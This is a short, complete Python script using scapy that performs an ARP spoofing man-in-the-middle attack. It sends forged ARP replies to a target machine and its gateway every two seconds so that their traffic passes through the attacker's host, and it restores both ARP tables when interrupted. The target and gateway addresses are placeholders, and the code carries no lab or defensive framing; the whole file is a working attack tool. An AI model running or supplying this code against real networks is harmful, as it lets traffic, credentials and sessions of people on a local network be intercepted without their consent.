#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

# Function to get the MAC address corresponding to an IP address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

# Function to spoof the target by sending ARP packets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Function to restore ARP tables to their original state
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Define target and gateway IP addresses
target_ip = "your_target_ip"
gateway_ip = "gateway_ip"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)  # Spoof the target, making it think we are the gateway
        spoof(gateway_ip, target_ip)  # Spoof the gateway, making it think we are the target
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables...\n")
    restore(target_ip, gateway_ip)  # Restore the target's ARP table
    restore(gateway_ip, target_ip)  # Restore the gateway's ARP table
